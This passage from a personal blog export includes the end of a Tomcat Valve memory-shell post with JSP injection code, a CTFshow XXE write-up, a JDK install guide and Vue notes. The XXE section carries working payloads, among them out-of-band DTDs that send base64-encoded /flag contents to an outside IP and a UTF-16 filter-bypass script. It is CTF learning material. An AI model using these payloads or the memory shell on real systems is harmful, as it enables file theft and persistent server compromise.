<p>首先要了解的是每一种<code>container</code>都有一个自己的<code>StandardValve</code>(也就是基础Value)</p>
<ul>
<li><p>StandardEngineValve</p>
</li>
<li><p>StandardHostValve</p>
</li>
<li><p>StandardContextValve</p>
</li>
<li><p>StandardWrapperValve</p>
</li>
</ul>
<p>这些<code>Valve</code>会将接收到的数据扔给下一个<code>Container</code>的<code>Pipeline</code></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423172536815.png" alt="image-20220423172536815"></p>
<p>Pipeline就像一个工厂中的生产线，负责调配工人（valve）的位置，valve则是生产线上负责不同操作的工人。<br>一个生产线的完成需要两步：<br>1，把原料运到工人边上<br>2，工人完成自己负责的部分</p>
<p>而tomcat的Pipeline实现是这样的：<br>1，在生产线上的第一个工人拿到生产原料后，二话不说就扔给下一个工人，下一个工人模仿第一个工人那样扔给下一个工人，直到最后一个工人，而最后一个工人被安排为上面提过的StandardValve，他要完成的工作居然是把生产资料运给自己包含的container的Pipeline上去。<br>2，四个container就相当于有四个生产线（Pipeline），四个Pipeline都这么干，直到最后的StandardWrapperValve拿到资源开始调用servlet。完成后返回来，一步一步的valve按照刚才丢生产原料是的顺序的倒序一次执行。如此才完成了tomcat的Pipeline的机制。</p>
<p>代码调用的地方</p>
<p>Adapter连接了Tomcat连接器<code>Connector</code>和容器<code>Container</code>它的实现类是<code>CoyoteAdapter</code>主要负责的是对请求进行封装,构造Request和Response对象.并将请求转发给Container也就是Servlet容器.</p>
<p>在<code>CoyoteAdapter</code>的<code>service</code>方法中调用了valve的invoke方法</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423173023450.png" alt="image-20220423173023450"></p>
<p>这里调用的是StandardEngineValve的invoke方法</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423173256592.png" alt="image-20220423173256592"></p>
<p>它在最后调用了Host容器的第一个Valve的invoke方法,如此像一条链一样走到之前写恶意valve的地方</p>
<h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><p>在获取pipeline的时候有个小坑,我看见StandardContext在调试的时候有pipeline属性就以为它里面有这个属性,但是其实是在他继承的ContainerBase类里面呢</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423171315008.png" alt="image-20220423171315008"></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423171440443.png" alt="image-20220423171440443"></p>
<p>同时代码稍作修改,也可以往host或者wrapper中添加恶意Valve</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//首先获取context,往context的管道中添加恶意Valve</span></span><br><span class="line"></span><br><span class="line">    Field requestField = request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    Request request1 =(Request) requestField.get(request);</span><br><span class="line">    StandardContext context =(StandardContext) request1.getContext();</span><br><span class="line">    <span class="comment">//    StandardHost standardHost = (StandardHost) request1.getHost();</span></span><br><span class="line">    <span class="comment">//    StandardWrapper standardWrapper = (StandardWrapper) request1.getWrapper();</span></span><br><span class="line">    Field pipelineField = ContainerBase.class.getDeclaredField(<span class="string">&quot;pipeline&quot;</span>);</span><br><span class="line">    pipelineField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardPipeline standardPipeline= (StandardPipeline) pipelineField.get(context);</span><br><span class="line">    <span class="comment">//   StandardPipeline standardPipeline2 = (StandardPipeline) pipelineField.get(standardHost);</span></span><br><span class="line">    <span class="comment">//   StandardPipeline standardPipeline3 = (StandardPipeline) pipelineField.get(standardWrapper);</span></span><br><span class="line"></span><br><span class="line">    ValveBase valveBase = <span class="keyword">new</span> ValveBase()&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    standardPipeline.addValve(valveBase);</span><br><span class="line">    </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考引用</p>
<p><a href="https://blog.csdn.net/Xxy605/article/details/124120724">https://blog.csdn.net/Xxy605/article/details/124120724</a></p>
</blockquote>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>花了不少时间看大佬的文章,才算将整个流程调试着跟下来并有了浅显的理解,如果不看大佬的分析,估计连有点地方入口在哪都找不到</p>
<p>期间也感受到了基础知识对于看代码是有多么重要,就getClass这一点过去总是误解为它获取的都是当前类的class,还有就是英语也很重要,有时候点进去看个源码的注释,还是得靠英语</p>
<p>加油吧!</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>memshell</tag>
        <tag>filter</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu安装Jdk11</title>
    <url>/2021/09/01/ubuntu%E5%AE%89%E8%A3%85Jdk11/</url>
    <content><![CDATA[<h5 id="1-首先去官网下载jdk11"><a href="#1-首先去官网下载jdk11" class="headerlink" title="1.首先去官网下载jdk11"></a>1.首先去官网下载jdk11</h5><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220901181241699.png" alt="image-20220901181241699"></p>
<p>上传到linux服务器</p>
<h5 id="2-在-usr-local-创建jdk目录，并解压到jdk目录，并改名为jdk11"><a href="#2-在-usr-local-创建jdk目录，并解压到jdk目录，并改名为jdk11" class="headerlink" title="2.在/usr/local/创建jdk目录，并解压到jdk目录，并改名为jdk11"></a>2.在/usr/local/创建jdk目录，并解压到jdk目录，并改名为jdk11</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir -p /usr/<span class="built_in">local</span>/jdk</span><br><span class="line"><span class="comment">#解压jdk11到jdk目录</span></span><br><span class="line">tar zxvf jdk-11.0.16_linux-x64_bin.tar.gz -C /usr/<span class="built_in">local</span>/jdk/</span><br><span class="line"><span class="comment">#改名进行区分</span></span><br><span class="line">mv /usr/<span class="built_in">local</span>/jdk/jdk-11.0.16 /usr/<span class="built_in">local</span>/jdk/jdk11</span><br></pre></td></tr></table></figure>

<h5 id="3、使用update-alternatives对java版本进行管理，方便后续使用时需要切换"><a href="#3、使用update-alternatives对java版本进行管理，方便后续使用时需要切换" class="headerlink" title="3、使用update-alternatives对java版本进行管理，方便后续使用时需要切换"></a>3、使用update-alternatives对java版本进行管理，方便后续使用时需要切换</h5><p><strong>这个工具的使用知识需要补充一下,解决了传统的手工配置环境变量的麻烦</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#添加java到update-alternatives进行管理(100这个值是可以调整的，越小越优先！！！)</span></span><br><span class="line">update-alternatives --install /usr/bin/java java /usr/<span class="built_in">local</span>/jdk/jdk11/bin/java 100</span><br><span class="line"><span class="comment">##这里是指导你怎么切换java版本，如果只有一个默认就是jdk11，就不用执行这条命令了</span></span><br><span class="line">update-alternatives --config java</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>xxe题目</title>
    <url>/2021/12/25/xxe%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<h2 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h2><h3 id="ctfshow-web-373"><a href="#ctfshow-web-373" class="headerlink" title="ctfshow web 373"></a>ctfshow web 373</h3><p>php://input</p>
<p>从官网信息来看，php://input是一个只读信息流，当请求方式是post的，并且enctype不等于”multipart/form-data”时，可以使用php://input来获取原始请求的数据。</p>
<p>数据包中反倒是不管是get还是post,php://input都会<label style="color:red">读取post类型数据包中变量位置</label>的数据(就是header头空一行下面的数据)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);<span class="comment">//设置为false则允许外部实体加载</span></span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);<span class="comment">//将获取到的数据包内容转换成字符串</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<span class="comment">//LIBXML_NOENT 该标志允许替换XML字符实体引用(无论是否外部)也就是允许 &amp;a; 这样的写法</span></span><br><span class="line">    <span class="variable">$creds</span> = simplexml_import_dom(<span class="variable">$dom</span>);<span class="comment">//把 DOM 节点转换为 SimpleXMLElement 对象。</span></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;<span class="comment">//找到里面的ctfshow标签</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;<span class="comment">//输出ctfshow标签的内容</span></span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>综合上面的分析,得知只需要将ctfshow标签中的内容设置成想要的内容即可,但是不能直接将ctfshow设置为根标签,在外部随便加一个标签就行</p>
<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">//上面为内部dtd文档</span><br><span class="line"><span class="tag">&lt;<span class="name">neo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">neo</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="ctfshow-web-374"><a href="#ctfshow-web-374" class="headerlink" title="ctfshow web 374"></a>ctfshow web 374</h3><p>本题没有回显,需要使用外带dtd</p>
<p>利用python在云服务器搭建一个http服务器,并保持监听</p>
<p><code>python3 -m http.server 5555</code></p>
<p>题目代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>本题有个疑问,就是为什么要使用php伪协议,突然想到本题没有回显,结合做过的文件包含题目,只有采用php伪协议才能读取到源码,就算是将文件包含进去了,也是执行代码,代码中不做输出,页面就不会显示输出</p>
<p>起初这样写了dtd文档</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % b SYSTEM &quot;http://121.40.113.226:5555/php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">%b;</span><br></pre></td></tr></table></figure>

<p>xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%xxe;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p>服务端给了这样的回显,说明是没有使用php协议,当成了路径,仔细一想,应该使用另一个实体来替换后面的伪协议内容</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220110180025568.png" alt="image-20220110180025568"></p>
<p> 更改后的dtd文档</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % b SYSTEM &quot;http://121.40.113.226:5555/%file;&quot;&gt;</span><br><span class="line">%b;</span><br></pre></td></tr></table></figure>

<p>这次服务端回显了200,说明有成功请求到dtd文档,但是忘了一个问题,这里的file变量需要读取的内容在靶机上,而我这样写就是读取攻击机的内容了……</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220110180342295.png" alt="image-20220110180342295"></p>
<p>查看了别人写的payload,明白了基本原理:利用xml的变量机制,把请求路径转换成通过base64编码的文件内容,所以得到的返回值是404</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220110182024289.png" alt="image-20220110182024289"></p>
<h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><p>xml</p>
<p>xml通过前面的尝试已经完全理解了</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">aaa</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%aaa;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>123<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>dtd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; xxe  SYSTEM &#x27;http://121.40.113.226:5555/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%xxe;</span><br></pre></td></tr></table></figure>

<p>有两个问题,</p>
<p>第一个就是为什么要将%进行编码为<code>&amp;#x25;</code>,我的理解是实体里面包含实体因为引号的原因,需要将其进行编码,我又进行了尝试,将第一个%也编码成<code>&amp;#x25;</code>,未成功</p>
<p>第二个是为什么要实体里面包含实体,不能直接执行</p>
<p><code>&lt;!ENTITY % xxe  SYSTEM &quot;http://121.40.113.226:5555/%file;&quot;&gt;  %xxe;</code></p>
<p>但是如果写成这样,请求的路径就还是dtd文档了<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220110183234994.png" alt="image-20220110183234994"></p>
<p>在尝试中一个偶然的错误让我有了启发,—-我忘记给dtd中的url加端口了</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220110183404676.png" alt="image-20220110183404676"></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220110183422805.png" alt="image-20220110183422805"></p>
<p>此时的请求路径还是dtd文档,那也就是说,之前所有请求文档的都是因为%aaa和dtd文档的错误书写</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220110183448490.png" alt="image-20220110183448490"></p>
<p>在dtd中如果颠倒%dtd和%xxe的顺序,请求路径还是dtd文档</p>
<p>突然看到用payload的时候请求信息是两条,</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220110185118318.png" alt="image-20220110185118318"></p>
<p>然后将dtd文档改成</p>
<p><code>&lt;!ENTITY % xxe  SYSTEM &#39;http://121.40.113.226:5555/1;&#39;&gt; %xxe;</code></p>
<p>请求路径还是两条</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220110185242294.png" alt="image-20220110185242294"></p>
<p>这个时候突然恍然大悟,为什么要用外部实体包裹它呢,是因为单个实体无法使用%file对路径进行替换,<laber style="color:red">真正发请求的还是%xxe</label>,用%dtd包裹它就可以使用%file对其进行替换,所以是先执行%dtd再执行%xxe</p>
<h3 id="ctfshow-web-375"><a href="#ctfshow-web-375" class="headerlink" title="ctfshow web 375"></a>ctfshow web 375</h3><p>题目代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>

<p>相较于374只是过滤了xml标签,但是没有xml对xml内容的读取没啥影响</p>
<h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h5><p>xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">aaa</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%aaa;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>123<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>dtd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; xxe  SYSTEM &#x27;http://121.40.113.226:5555/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%xxe;</span><br></pre></td></tr></table></figure>

<h3 id="ctfshow-web-376"><a href="#ctfshow-web-376" class="headerlink" title="ctfshow web 376"></a>ctfshow web 376</h3><p>这题只是将正则转变成了不区分大小写,payload还是同上375题的</p>
<h3 id="ctfshow-web-377"><a href="#ctfshow-web-377" class="headerlink" title="ctfshow web 377"></a>ctfshow web 377</h3><p>题目代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br></pre></td></tr></table></figure>

<p>本题对http关键字做了过滤,但是xml可以用utf16编码</p>
<h5 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload=<span class="string">&quot;&quot;&quot;&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % aaa SYSTEM &quot;http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%aaa;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;test&gt;123&lt;/test&gt;&quot;&quot;&quot;</span></span><br><span class="line">url=<span class="string">&quot;http://032b023b-084a-41ee-9c3e-2a3bec8669da.challenge.ctf.show&quot;</span></span><br><span class="line">requests.post(url=url,data=payload.encode(<span class="string">&quot;utf-16&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>有个疑问:用web377用python转换成utf-16编码后post包用burp抓住后,里面还是包含http字符串的,咋就绕过了呢</p>
<p>这个是用burp抓的python发的包</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220110205856482.png" alt="image-20220110205856482"></p>
<h3 id="ctfshow-web-378"><a href="#ctfshow-web-378" class="headerlink" title="ctfshow web 378"></a>ctfshow web 378</h3><h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这道题的payload很简单,但是起初我一直抓不到发给dologin的数据包,这是为何????,但是后面又抓到了…..</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220110205445709.png" alt="image-20220110205445709"></p>
]]></content>
      <categories>
        <category>xxe</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>vue学习记录</title>
    <url>/2022/07/18/vue%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="vue学习记录"><a href="#vue学习记录" class="headerlink" title="vue学习记录"></a>vue学习记录</h2><p>这篇文章主要用于自己开发[背忘录]项目中遇到的一些问题和解决方法</p>
<p>项目开发中使用的是vue 和element-ui</p>
<h3 id="界面问题"><a href="#界面问题" class="headerlink" title="界面问题"></a>界面问题</h3><p>在本项目中对于界面采用的是element-ui的container容器</p>
<p>在该组件中的<code>&lt;el-main&gt;</code>组件里嵌套<code>&lt;router-view&gt;&lt;/router-view&gt;</code>标签用来作为整个单页面应用（spa）的显示窗口</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220718204211612.png" alt="image-20220718204211612"></p>
<p>同时头部和footer都自定义组件并引入从而实现统一性,需要注意的是引入组件后标签需要采用小写和-的方式来替代驼峰命名</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220718204332102.png" alt="image-20220718204332102"></p>
<p>比如原来是<code>CommonHeader</code>现在就需要写成<code>&lt;common-header&gt;&lt;/common-header&gt;</code></p>
<h4 id="默认页面"><a href="#默认页面" class="headerlink" title="默认页面"></a>默认页面</h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220718204613496.png" alt="image-20220718204613496"></p>
<p>由于本项目是单页面应用,只需要通过路由跳转让主页面的<code>&lt;router-view&gt;&lt;/router-view&gt;</code>替换内容即可,但是由于<code>/</code>需要引入<code>Main.vue</code>这个总的布局模板,而<code>&lt;router-view&gt;</code>就写在<code>Main.vue</code>中,所以不能直接在<code>Main.vue</code>中写主页面的内容,这时候就需要给<code>/</code>这个路由添加一个重定向属性’redirect’让其重定向到<code>/</code>的子路由<code>/index</code></p>
<h3 id="axios使用"><a href="#axios使用" class="headerlink" title="axios使用"></a>axios使用</h3><p>先npm安装axios</p>
<p>在main.js中引入axios后还需要将其绑定到Vue的prototype属性上才能用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import axios from &#x27;axios&#x27;</span><br><span class="line">Vue.prototype.$axios=axios</span><br></pre></td></tr></table></figure>

<p>或者不绑定prototype直接在每个需要使用axios的地方再引入一次</p>
<p>对于请求的格式,按照这样的格式来写,就可以在最后的then里面访问到返回的res和做赋值给return里面的变量值的操作</p>
<p>如果把<code>data</code>改为<code>params</code>就会将参数拼接到url后面,类似get传参,但是好像不会进行url编码</p>
<p>至于header头,则按需添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">axios(&#123;</span><br><span class="line">        method: &#x27;post&#x27;,</span><br><span class="line">        url: &#x27;api&#x27;,</span><br><span class="line">        headers: &#123; &#x27;content-type&#x27;: &#x27;application/x-www-form-urlencoded&#x27; &#125;,</span><br><span class="line">        data: this.$qs.stringify(&#123;</span><br><span class="line">          q: &quot;12312312&quot;</span><br><span class="line">        &#125;),</span><br><span class="line">      &#125;).then((res) =&gt; &#123;</span><br><span class="line">        console.log(res)</span><br><span class="line">      &#125;)</span><br></pre></td></tr></table></figure>



<h3 id="axios配置跨域请求"><a href="#axios配置跨域请求" class="headerlink" title="axios配置跨域请求"></a>axios配置跨域请求</h3><p>仅适用于使用vue-cli创建的vue项目中</p>
<p>在vue.config.js文件中输入内容如下,并且之后请求的时候,使用<code>api</code>来替代target</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line"></span><br><span class="line">  <span class="attr">devServer</span>: &#123;</span><br><span class="line"></span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;/api&#x27;</span>: &#123;</span><br><span class="line">        <span class="attr">target</span>: <span class="string">&#x27;https://openapi.youdao.com/api&#x27;</span>,</span><br><span class="line">        <span class="comment">//ws:true,</span></span><br><span class="line">        <span class="attr">changeOrigin</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">pathRewrite</span>: &#123;</span><br><span class="line">          <span class="string">&#x27;^/api&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220719185901835.png" alt="image-20220719185901835"></p>
<p>axios配置传统的post键值对传值方式</p>
<p>需要引入<code>qs</code>插件</p>
<p>在项目目录下<code>npm install qs</code></p>
<p>在<code>main.js</code>中</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> qs <span class="keyword">from</span> <span class="string">&#x27;qs&#x27;</span></span><br><span class="line">Vue.prototype.$qs = qs</span><br></pre></td></tr></table></figure>

<p>接下来就可以使用<code>this.$qs.stringify(&#123;&#125;)</code>将值包裹再传递给data,这样发送的就不再是json数据了</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220719190156526.png" alt="image-20220719190156526"></p>
<h3 id="在vue中使用md5等哈希函数"><a href="#在vue中使用md5等哈希函数" class="headerlink" title="在vue中使用md5等哈希函数"></a>在vue中使用md5等哈希函数</h3><p>直接npm install js-md5 , js-sha256等</p>
<p>一样绑定到prototype上</p>
